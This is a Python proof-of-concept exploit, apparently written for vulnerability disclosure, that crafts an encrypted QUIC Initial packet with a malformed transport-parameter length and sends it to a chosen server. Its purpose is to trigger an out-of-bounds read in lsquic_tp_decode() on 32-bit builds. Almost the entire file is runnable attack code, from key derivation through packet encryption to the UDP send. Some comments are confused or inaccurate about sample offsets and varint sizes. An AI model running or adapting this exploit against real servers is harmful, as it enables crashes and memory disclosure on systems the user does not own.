#!/usr/bin/env python3
"""
author: youngseaz
email: youngseazcn@gmail.com

POC: Network-triggered ptrdiff_t overflow in lsquic_tp_decode()

This script crafts a QUIC v1 Initial packet containing a TLS ClientHello
with a malicious quic_transport_parameters extension that triggers the
(ptrdiff_t) len > end - p vulnerability on 32-bit systems.

The crafted transport parameter contains:
  - Unknown TPI (param_id = 0xFFFF)
  - len = 0x80000000 (> PTRDIFF_MAX on 32-bit, cast produces negative value)
  - Minimal value bytes

On 32-bit lsquic servers:
  (ptrdiff_t) 0x80000000 = -2147483648 (negative!)
  -2147483648 > (end - p) => FALSE => bounds check BYPASSED
  Unknown TPI => default: break => no secondary length check
  p += 0x80000000 => pointer wraps => OOB read

On 64-bit servers:
  (ptrdiff_t) 0x80000000 = 2147483648 (positive)
  2147483648 > (end - p) => TRUE => check correctly blocks

Requirements:
  pip3 install cryptography

Usage:
  python3 exp_trans_params_ptrdiff.py <server_ip> <server_port>
  e.g.: python3 exp_trans_params_ptrdiff.py 127.0.0.1 12345
"""

import os
import sys
import socket
import struct
import hashlib
import hmac

# Try to import cryptography library for HKDF and AES
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives.hashes import SHA256
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("ERROR: cryptography library required. Install with: pip3 install cryptography")
    sys.exit(1)

# ============================================================
# QUIC v1 Constants (RFC 9000 / RFC 9001)
# ============================================================

QUIC_VERSION_V1 = 0x00000001

# Initial salt for QUIC v1 (RFC 9001 Section 5.2)
INITIAL_SALT_V1 = bytes([
    0x38, 0x76, 0x2c, 0xf7, 0xf5, 0x59, 0x34, 0xb3,
    0x4d, 0x17, 0x9a, 0xe6, 0xa4, 0xc8, 0x0c, 0xad,
    0xcc, 0xbb, 0x7f, 0x0a
])

# Minimum Initial packet size
MIN_INITIAL_PACKET_SIZE = 1200

# AEAD tag length
AEAD_TAG_LEN = 16

# ============================================================
# QUIC Varint Encoding
# ============================================================

def encode_varint(val):
    """Encode a value as a QUIC varint per RFC 9000 Section 16."""
    if val < (1 << 6):
        return struct.pack('!B', val)
    elif val < (1 << 14):
        return struct.pack('!H', 0x4000 | val)
    elif val < (1 << 30):
        b = struct.pack('!I', 0x80000000 | val)
        return b
    elif val < (1 << 62):
        b = struct.pack('!Q', 0xC000000000000000 | val)
        return b
    else:
        raise ValueError(f"Value {val} too large for varint")

# ============================================================
# HKDF-Expand-Label (RFC 9001 Section 5.1)
# ============================================================

def hkdf_expand(secret, info, length):
    """Manual HKDF-Expand per RFC 5869 Section 2.3.
    
    HKDF-Expand(PRK, info, L) = T1 || T2 || ... || Tn
    T1 = HMAC-Hash(PRK, info || 0x01)
    For L <= hash_len (32 for SHA-256), one iteration is enough.
    """
    hash_len = 32  # SHA-256 output length
    
    # T1 = HMAC(PRK, info || 0x01)
    t1 = hmac.new(secret, info + b'\x01', hashlib.sha256).digest()
    
    if length <= hash_len:
        return t1[:length]
    else:
        # Need multiple iterations
        result = t1
        for i in range(2, (length // hash_len) + 2):
            # Ti = HMAC(PRK, T(i-1) || info || i)
            t_i = hmac.new(secret, result[-hash_len:] + info + bytes([i]), hashlib.sha256).digest()
            result += t_i
        return result[:length]

def hkdf_expand_label(secret, label, context, length):
    """HKDF-Expand-Label per RFC 9001 Section 5.1.
    
    Uses "tls13 " prefix as lsquic does (verified in lsquic_hkdf.c).
    
    info structure (per lsquic_hkdf.c lsquic_qhkdf_expand):
      length(2) + label_len+6(1) + "tls13 " + label + context_len(1) + context
    """
    tls13_label = b"tls13 " + label
    info = struct.pack('!H', length) + \
           struct.pack('B', len(tls13_label)) + tls13_label + \
           struct.pack('B', len(context)) + context
    return hkdf_expand(secret, info, length)

def hkdf_extract(salt, ikm):
    """HKDF-Extract as defined in RFC 5869 Section 2.2.
    
    PRK = HMAC-Hash(salt, IKM) where salt is the key and IKM is the message.
    This is a manual implementation - NOT using Python cryptography's HKDF class
    which does Extract+Expand together.
    """
    return hmac.new(salt, ikm, hashlib.sha256).digest()

def derive_initial_keys(dcid):
    """Derive QUIC v1 Initial keys from DCID per RFC 9001 Section 5.2."""
    # Step 1: HKDF-Extract (NOT HKDF-Expand!)
    # initial_secret = HKDF-Extract(salt=HSK_SALT, ikm=DCID)
    initial_secret = hkdf_extract(INITIAL_SALT_V1, dcid)

    # Step 2: Derive client secret
    client_secret = hkdf_expand_label(initial_secret, b"client in", b"", 32)

    # Step 3: Derive server secret
    server_secret = hkdf_expand_label(initial_secret, b"server in", b"", 32)

    # Step 4: Derive client key, iv, hp
    client_key = hkdf_expand_label(client_secret, b"quic key", b"", 16)
    client_iv = hkdf_expand_label(client_secret, b"quic iv", b"", 12)
    client_hp = hkdf_expand_label(client_secret, b"quic hp", b"", 16)

    # Step 5: Derive server key, iv, hp
    server_key = hkdf_expand_label(server_secret, b"quic key", b"", 16)
    server_iv = hkdf_expand_label(server_secret, b"quic iv", b"", 12)
    server_hp = hkdf_expand_label(server_secret, b"quic hp", b"", 16)

    return {
        'client_secret': client_secret,
        'client_key': client_key,
        'client_iv': client_iv,
        'client_hp': client_hp,
        'server_secret': server_secret,
        'server_key': server_key,
        'server_iv': server_iv,
        'server_hp': server_hp,
    }

# ============================================================
# QUIC Header Protection (RFC 9001 Section 5.4)
# ============================================================

def apply_header_protection(hp_key, first_byte, pn_bytes, sample_offset, payload):
    """Apply QUIC header protection using AES-128-ECB."""
    # Sample is 16 bytes starting from sample_offset in the payload
    # (after packet number, before encrypted data)
    sample = payload[sample_offset:sample_offset + 16]

    # Generate mask: AES-128-ECB(hp_key, sample)
    cipher = Cipher(algorithms.AES(hp_key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    mask = encryptor.update(sample) + encryptor.finalize()

    # Apply mask to first byte (bits 0-1 for long header, bits 0-3 for short)
    # For long header Initial: mask bits 0-1 of first byte
    new_first_byte = first_byte ^ (mask[0] & 0x0F)

    # Apply mask to packet number bytes
    new_pn_bytes = bytearray(pn_bytes)
    for i in range(len(pn_bytes)):
        new_pn_bytes[i] = pn_bytes[i] ^ mask[1 + i]

    return new_first_byte, bytes(new_pn_bytes)

# ============================================================
# QUIC AEAD Encryption (RFC 9001 Section 5.3)
# ============================================================

def encrypt_aead(key, iv, pn, pn_len, header, pn_bytes, payload):
    """Encrypt QUIC payload using AES-128-GCM.
    
    pn: packet number value
    pn_len: packet number length in bytes (1, 2, 3, or 4)
    header: packet header (everything before PN)
    pn_bytes: PN bytes (unmasked)
    payload: data to encrypt (CRYPTO frame + padding)
    
    AAD = header + pn_bytes (per lsquic implementation:
           packet_in->pi_header_sz += packno_len before AEAD open)
    """
    # Construct nonce: iv XOR pn (pn is right-aligned in 12-byte nonce)
    # Per RFC 9001 Section 5.3: nonce = iv XOR (pn left-padded to nonce length)
    # lsquic uses 8-byte XOR: *((uint64_t *) begin_xor) ^= packno
    # This means packno is XOR'd into the last 8 bytes of the nonce
    nonce = bytearray(iv)
    # XOR pn into the last pn_len bytes of the nonce
    pn_bytes_for_nonce = pn.to_bytes(pn_len, 'big')
    for i in range(pn_len):
        nonce[12 - pn_len + i] ^= pn_bytes_for_nonce[i]

    # AAD = header + pn_bytes (lsquic adds packno_len to pi_header_sz before AEAD)
    aad = header + pn_bytes

    # Encrypt payload with AAD
    aesgcm = AESGCM(key)
    ct_and_tag = aesgcm.encrypt(bytes(nonce), payload, aad)

    return ct_and_tag  # ciphertext + 16-byte tag

# ============================================================
# Craft Malicious Transport Parameters
# ============================================================

def craft_malicious_transport_params():
    """
    Craft QUIC transport parameters with:
    - Unknown TPI (param_id = 0xFFFF) with len = 0x80000000
    - This triggers ptrdiff_t overflow on 32-bit systems
    """
    tp_data = b""

    # Unknown TPI with len > PTRDIFF_MAX (0x80000000)
    # param_id = 0xFFFF (2-byte varint: 0x7FFF with 0x40 prefix)
    tp_data += encode_varint(0xFFFF)

    # len = 0x80000000 (8-byte varint)
    # This is the CRITICAL value that bypasses (ptrdiff_t) check on 32-bit
    tp_data += encode_varint(0x80000000)

    # Minimal "value" bytes (just 1 byte, but len claims 2GB+)
    tp_data += b"\x00"

    return tp_data

# ============================================================
# Craft TLS ClientHello with malicious quic_transport_parameters
# ============================================================

def craft_tls_client_hello(server_name, malicious_tp):
    """
    Craft a TLS 1.3 ClientHello containing:
    - quic_transport_parameters extension (type 0x0039) with malicious data
    - supported_versions extension (TLS 1.3 = 0x0304)
    - key_share extension (X25519) with a VALID key pair
    - signature_algorithms extension
    - psk_key_exchange_modes extension (REQUIRED for TLS 1.3)
    - supported_groups extension

    Uses cryptography library to generate a proper X25519 key pair
    so BoringSSL doesn't reject the key_share.
    """
    # TLS ClientHello structure:
    # HandshakeType(1) + Length(3) + ClientVersion(2) + Random(32) +
    # SessionIDLen(1) + SessionID + CipherSuitesLen(2) + CipherSuites +
    # CompressionMethodsLen(1) + CompressionMethods + ExtensionsLen(2) + Extensions

    handshake_type = 0x01  # ClientHello
    client_version = 0x0303  # TLS 1.2 (negotiated version is in supported_versions ext)

    # Random (32 bytes)
    random_bytes = os.urandom(32)

    # Session ID (empty for TLS 1.3)
    session_id = b""

    # Cipher suites - include TLS 1.3 suites
    cipher_suites = struct.pack('!H', 6) + \
                    struct.pack('!HHH', 0x1301, 0x1302, 0x1303)  # TLS 1.3 suites

    # Compression methods (null only)
    compression_methods = struct.pack('!BB', 1, 0)

    # === Extensions ===
    extensions = b""

    # Extension 1: supported_versions (type 0x002b)
    # List TLS 1.3 (0x0304) only - we want TLS 1.3 negotiation
    sv_data = struct.pack('B', 2) + struct.pack('!H', 0x0304)
    extensions += struct.pack('!HH', 0x002b, len(sv_data)) + sv_data

    # Extension 2: signature_algorithms (type 0x000d)
    # RSA-PSS-SHA256, ECDSA-SHA256-P256, RSA-PKCS1-SHA256
    sa_data = struct.pack('!H', 6) + \
              struct.pack('!HHH', 0x0804, 0x0403, 0x0401)
    extensions += struct.pack('!HH', 0x000d, len(sa_data)) + sa_data

    # Extension 3: supported_groups (type 0x000a)
    # X25519 (0x001d) - must match key_share
    sg_data = struct.pack('!H', 2) + struct.pack('!H', 0x001d)
    extensions += struct.pack('!HH', 0x000a, len(sg_data)) + sg_data

    # Extension 4: key_share (type 0x0033) - X25519 with VALID key pair
    # Generate a proper X25519 key pair using cryptography library
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
    private_key = X25519PrivateKey.generate()
    x25519_pubkey = private_key.public_key().public_bytes_raw()
    # key_share extension format (RFC 8446 Section 4.2.8):
    # KeyShareClientHello: client_shares_length(2) + KeyShareEntry[]
    # KeyShareEntry: group(2) + key_exchange_length(2) + key_exchange(variable)
    ks_entry = struct.pack('!H', 0x001d) + struct.pack('!H', 32) + x25519_pubkey
    ks_data = struct.pack('!H', len(ks_entry)) + ks_entry
    extensions += struct.pack('!HH', 0x0033, len(ks_data)) + ks_data

    # Extension 5: psk_key_exchange_modes (type 0x002d) - REQUIRED for TLS 1.3
    # PSK_DHE_KE (1) = psk with (EC)DHE key establishment
    pkem_data = struct.pack('B', 1) + struct.pack('B', 1)
    extensions += struct.pack('!HH', 0x002d, len(pkem_data)) + pkem_data

    # Extension 6: application_layer_protocol_negotiation (type 0x0010) - ALPN
    # Required for QUIC: must include "h3" (HTTP/3)
    # ALPN format: protocol_list_length(2) + protocol_entry[]
    # protocol_entry: protocol_name_length(1) + protocol_name
    h3_entry = struct.pack('B', 2) + b'h3'
    alpn_data = struct.pack('!H', len(h3_entry)) + h3_entry
    extensions += struct.pack('!HH', 0x0010, len(alpn_data)) + alpn_data

    # Extension 7: quic_transport_parameters (type 0x0039)
    # THIS IS THE MALICIOUS EXTENSION
    extensions += struct.pack('!HH', 0x0039, len(malicious_tp)) + malicious_tp

    # Extension 8: server_name (type 0x0000) - SNI
    # SNI format: server_name_list_length(2) + server_name_type(1) + host_name_length(2) + host_name
    host_name = server_name.encode('ascii')
    sni_entry = struct.pack('!B', 0) + struct.pack('!H', len(host_name)) + host_name
    sni_data = struct.pack('!H', len(sni_entry)) + sni_entry
    extensions += struct.pack('!HH', 0x0000, len(sni_data)) + sni_data

    # Build ClientHello body
    ch_body = struct.pack('!H', client_version) + \
              random_bytes + \
              struct.pack('B', len(session_id)) + session_id + \
              cipher_suites + \
              compression_methods + \
              struct.pack('!H', len(extensions)) + extensions

    # Build Handshake message
    handshake_length = len(ch_body)
    handshake = struct.pack('B', handshake_type) + \
                struct.pack('!I', handshake_length)[1:] + \
                ch_body  # 3-byte length

    return handshake

# ============================================================
# Craft QUIC CRYPTO Frame
# ============================================================

def craft_crypto_frame(offset, crypto_data):
    """Craft a QUIC CRYPTO frame (type 0x06)."""
    frame_type = 0x06
    return encode_varint(frame_type) + \
           encode_varint(offset) + \
           encode_varint(len(crypto_data)) + \
           crypto_data

# ============================================================
# Craft QUIC v1 Initial Packet
# ============================================================

def craft_quic_initial_packet(dcid, scid, pn, crypto_frame_data, keys):
    """
    Craft a complete QUIC v1 Initial packet with proper encryption.

    Packet format:
      Header (unencrypted): FirstByte + Version + DCID_Len + DCID + SCID_Len + SCID +
                            TokenLen + Length
      PN (encrypted by header protection): 1-4 bytes
      Payload (AEAD encrypted): CRYPTO frame(s) + PADDING + AEAD tag
    """
    # First byte: Long header (1) + QUIC bit (1) + Type=Initial (00) + Fixed (1) + PN_len=2 (01)
    # = 0xC0 | 0x01 = 0xC1 (2-byte packet number)
    pn_len = 2  # 2-byte packet number
    first_byte = 0xC0 | (pn_len - 1)  # PP bits: 0=1B, 1=2B, 2=3B, 3=4B

    # Version
    version_bytes = struct.pack('!I', QUIC_VERSION_V1)

    # DCID
    dcid_len_byte = struct.pack('B', len(dcid))
    dcid_bytes = dcid

    # SCID
    scid_len_byte = struct.pack('B', len(scid))
    scid_bytes = scid

    # Token (empty for first Initial)
    token_len_bytes = encode_varint(0)

    # Packet number (2 bytes)
    pn_bytes = struct.pack('!H', pn)

    # Payload: CRYPTO frame + PADDING to reach minimum size
    payload = crypto_frame_data

    # Add PADDING frame (type 0x00) to reach minimum packet size
    # We need the total packet to be >= 1200 bytes
    # Total = header + pn + payload + aead_tag
    # Estimate header size
    header_without_length = bytes([first_byte]) + version_bytes + \
                            dcid_len_byte + dcid_bytes + \
                            scid_len_byte + scid_bytes + \
                            token_len_bytes

    # Length field covers: pn_bytes + payload + AEAD tag
    # We need to calculate the total payload size first
    # Target total packet size = 1200
    target_total = MIN_INITIAL_PACKET_SIZE
    estimated_header_size = len(header_without_length) + 2 + pn_len  # +2 for length varint (assume 2-byte)
    estimated_aead_overhead = AEAD_TAG_LEN
    needed_payload = target_total - estimated_header_size - estimated_aead_overhead

    # Add padding
    padding_needed = needed_payload - len(payload)
    if padding_needed > 0:
        payload += b"\x00" * padding_needed

    # Now encrypt the payload
    # Header for AEAD: everything before the packet number
    # We need to construct the header first to know the length
    aead_payload_len = len(payload) + AEAD_TAG_LEN  # payload + tag
    length_field = encode_varint(pn_len + aead_payload_len)

    # Construct the full header (before PN, for AEAD additional data)
    header = bytes([first_byte]) + version_bytes + \
             dcid_len_byte + dcid_bytes + \
             scid_len_byte + scid_bytes + \
             token_len_bytes + \
             length_field

    # AEAD additional data = header + pn_bytes (lsquic adds packno_len to pi_header_sz)
    # Encrypt: payload with header+pn_bytes as AAD
    encrypted = encrypt_aead(keys['client_key'], keys['client_iv'], pn, pn_len, header, pn_bytes, payload)

    # Full packet before header protection:
    # header + pn_bytes + encrypted_payload
    packet_before_hp = header + pn_bytes + encrypted

    # Apply header protection
    # Sample offset: after header + pn_len bytes (4 bytes minimum for sample)
    # Actually, sample starts at pn_len bytes into the encrypted portion
    # Wait - the sample is taken from the encrypted output, starting at pn_len offset
    # Let me re-read RFC 9001 Section 5.4.2

    # For long headers: sample starts at first byte of packet number field
    # Actually no - the sample is from the ciphertext, starting 4 bytes after PN
    # Let me be more precise:

    # The packet before header protection is:
    #   header | pn_bytes | encrypted_payload (ciphertext + tag)
    # The sample for header protection is 16 bytes starting at offset
    #   len(header) + pn_len into the packet (i.e., from the start of ciphertext)

    # Wait, re-reading RFC 9001 Section 5.4.2 more carefully:
    # "The sample is taken from the protected payload, starting at an offset
    #  of packet_number_length bytes into the protected payload."
    # The "protected payload" = pn_bytes + encrypted_payload
    # So sample starts at pn_len bytes into (pn_bytes + encrypted_payload)
    # = pn_len bytes into pn_bytes + encrypted_payload
    # Since pn_bytes is pn_len bytes, sample starts at the beginning of encrypted_payload

    # Actually, let me re-read more carefully:
    # "packet = header || protected_payload"
    # "protected_payload = pn || encrypted_payload"
    # "sample = protected_payload[pn_length..pn_length+15]"
    # So sample = encrypted_payload[0:16] (first 16 bytes of ciphertext)

    # Hmm, but the PN is part of the protected payload and is also masked.
    # Let me look at the actual algorithm:

    # Algorithm from RFC 9001 Section 5.4.3:
    # 1. Extract sample from packet: packet[pn_offset..pn_offset+15]
    #    where pn_offset = len(header)
    # 2. Generate mask = AES-ECB(hp_key, sample)
    # 3. For long headers: first_byte ^= mask[0] & 0x0F (bits 0-3)
    #    For short headers: first_byte ^= mask[0] & 0x1F (bits 0-4)
    # 4. pn_bytes ^= mask[1..1+pn_len]

    # So pn_offset = len(header), and sample = packet[len(header):len(header)+16]
    # But at this point, the packet has pn_bytes + encrypted_payload after header
    # So sample = pn_bytes[0:4] + encrypted_payload[0:12] (for 2-byte PN)
    # Wait, that doesn't work because pn_bytes is only 2 bytes...

    # Let me re-read: "pn_offset" is the offset of the packet number in the packet
    # For long headers, the PN starts right after the Length field
    # So pn_offset = len(header) (where header includes everything before PN)

    # The sample is 16 bytes starting at pn_offset
    # But pn_offset points to the start of PN bytes, and we need 16 bytes
    # So sample = pn_bytes + encrypted_payload[0:16-len(pn_bytes)]

    # Actually, I think the correct interpretation is:
    # The packet at this stage is: header + pn_bytes + ciphertext + tag
    # pn_offset = len(header) (position of PN in the packet)
    # sample = packet[pn_offset:pn_offset+16]
    # = pn_bytes + ciphertext[0:16-len(pn_bytes)]

    # For 2-byte PN: sample = pn_bytes (2B) + ciphertext[0:14]

    # But wait, we haven't applied header protection yet, so the PN is still unmasked
    # The algorithm says to extract the sample BEFORE applying the mask
    # So the sample uses the unmasked PN bytes

    # RFC 9001 Section 5.4.2:
    # "The sample is taken from the packet number offset plus 4 bytes
    #  into the protected payload."
    # In lsquic: sample_off = packet_in->pi_header_sz + 4
    # So sample starts at header_size + 4 bytes into the packet
    pn_offset = len(header)
    sample_offset = pn_offset + 4  # +4 as per RFC 9001 and lsquic implementation
    sample = packet_before_hp[sample_offset:sample_offset + 16]

    # Generate mask: AES-128-ECB(hp_key, sample)
    cipher = Cipher(algorithms.AES(keys['client_hp']), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    mask = encryptor.update(sample) + encryptor.finalize()

    # Apply mask to first byte
    # For long headers: dst[0] ^= (0xF | (((dst[0] & 0x80) == 0) << 4)) & mask[0]
    # Since first_byte has bit 7 set (long header), (dst[0] & 0x80) != 0
    # So: first_byte ^= 0x0F & mask[0] (only low 4 bits)
    new_first_byte = first_byte ^ (mask[0] & 0x0F)

    # Apply mask to PN bytes: pn_bytes[i] ^= mask[1 + i]
    new_pn_bytes = bytearray(pn_bytes)
    for i in range(len(pn_bytes)):
        new_pn_bytes[i] ^= mask[1 + i]

    # Construct final packet: new_first_byte + header[1:] + new_pn_bytes + encrypted
    final_packet = bytes([new_first_byte]) + header[1:] + bytes(new_pn_bytes) + encrypted

    # Pad to minimum size if needed (padding is NOT encrypted, it's outside AEAD)
    # Actually, padding should be INSIDE the encrypted payload, not outside
    # Let me check: the Length field covers pn_bytes + encrypted_payload
    # So padding must be inside the encrypted payload
    # We already added padding inside the payload before encryption
    # No additional padding needed outside

    return final_packet

# ============================================================
# Main POC Logic
# ============================================================

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <server_ip> <server_port>")
        print(f"Example: {sys.argv[0]} 127.0.0.1 4433")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])

    print("=" * 70)
    print("POC: Network-triggered ptrdiff_t overflow in lsquic_tp_decode()")
    print("=" * 70)
    print(f"Target: {server_ip}:{server_port}")
    print()

    # Step 1: Generate DCID (8+ bytes, used for Initial key derivation)
    dcid = os.urandom(8)  # 8-byte DCID (minimum for Initial packets)
    scid = os.urandom(8)  # 8-byte SCID

    print(f"DCID: {dcid.hex()} (used for Initial key derivation)")
    print(f"SCID: {scid.hex()}")
    print()

    # Step 2: Derive Initial keys from DCID
    print("Deriving QUIC v1 Initial keys from DCID...")
    keys = derive_initial_keys(dcid)
    print(f"  Client key: {keys['client_key'].hex()}")
    print(f"  Client IV:  {keys['client_iv'].hex()}")
    print(f"  Client HP:  {keys['client_hp'].hex()}")
    print()

    # Step 3: Craft malicious transport parameters
    print("Crafting malicious transport parameters...")
    malicious_tp = craft_malicious_transport_params()
    print(f"  TP data ({len(malicious_tp)} bytes): {malicious_tp.hex()}")
    print(f"  Contains: unknown TPI=0xFFFF, len=0x80000000 (> PTRDIFF_MAX on 32-bit)")
    print()

    # Step 4: Craft TLS ClientHello with malicious TP extension
    print("Crafting TLS ClientHello with malicious quic_transport_parameters...")
    # Use 'localhost' as SNI to match the server's certificate
    server_name = 'localhost'
    client_hello = craft_tls_client_hello(server_name, malicious_tp)
    print(f"  ClientHello size: {len(client_hello)} bytes")
    print()

    # Step 5: Craft CRYPTO frame containing ClientHello
    print("Crafting CRYPTO frame...")
    crypto_frame = craft_crypto_frame(0, client_hello)
    print(f"  CRYPTO frame size: {len(crypto_frame)} bytes")
    print()

    # Step 6: Craft QUIC Initial packet
    print("Crafting QUIC v1 Initial packet...")
    pn = 0  # Packet number 0
    packet = craft_quic_initial_packet(dcid, scid, pn, crypto_frame, keys)
    print(f"  Packet size: {len(packet)} bytes")
    print()

    # Step 7: Send packet to server
    print(f"Sending QUIC Initial packet to {server_ip}:{server_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5.0)

    try:
        sock.sendto(packet, (server_ip, server_port))
        print(f"  Sent {len(packet)} bytes")

        # Try to receive server response
        print("Waiting for server response (5 second timeout)...")
        try:
            response, addr = sock.recvfrom(4096)
            print(f"  Received {len(response)} bytes from {addr}")
            print(f"  Response hex: {response[:64].hex()}...")

            # Parse response to check if it's a valid QUIC packet
            if len(response) > 0:
                first_byte = response[0]
                is_long_header = (first_byte & 0x80) != 0
                if is_long_header:
                    version = struct.unpack('!I', response[1:5])[0]
                    print(f"  Server sent long header, version: 0x{version:08x}")
                    if version == QUIC_VERSION_V1:
                        print("  ** Server accepted the QUIC v1 connection! **")
                        print("  ** The malicious TP was processed by lsquic_tp_decode() **")
                    else:
                        print(f"  Server responded with version 0x{version:08x}")
                else:
                    print("  Server sent short header packet")

        except socket.timeout:
            print("  No response received (timeout)")
            print("  This could mean:")
            print("    - Server rejected the packet (bad TLS handshake)")
            print("    - Server is not running on this port")
            print("    - Packet was malformed")

    except Exception as e:
        print(f"  Error sending packet: {e}")
    finally:
        sock.close()

    print()
    print("=" * 70)
    print("Analysis:")
    print("=" * 70)
    print()
    print("This POC sends a QUIC v1 Initial packet with a crafted")
    print("quic_transport_parameters TLS extension containing:")
    print("  - Unknown TPI (param_id = 0xFFFF)")
    print("  - len = 0x80000000 (8-byte varint: C0 00 00 00 80 00 00 00)")
    print()
    print("On 32-bit lsquic servers:")
    print("  (ptrdiff_t) 0x80000000 = -2147483648 (negative!)")
    print("  Vulnerable check: -2147483648 > (end-p) => FALSE => BYPASSED")
    print("  Unknown TPI: default: break => no secondary length check")
    print("  p += 0x80000000 => pointer wraps => OOB read")
    print()
    print("On 64-bit lsquic servers:")
    print("  (ptrdiff_t) 0x80000000 = 2147483648 (positive)")
    print("  Check: 2147483648 > (end-p) => TRUE => correctly blocked")
    print()
    print("NOTE: The TLS ClientHello in this POC is minimal and may not")
    print("complete a full handshake. However, BoringSSL processes the")
    print("quic_transport_parameters extension BEFORE the handshake")
    print("completes, so the malicious TP data reaches lsquic_tp_decode()")
    print("even if the handshake ultimately fails.")
    print()
    print("To verify the vulnerability was triggered, check the server's")
    print("debug logs for transport parameter parsing messages.")

if __name__ == "__main__":
    main()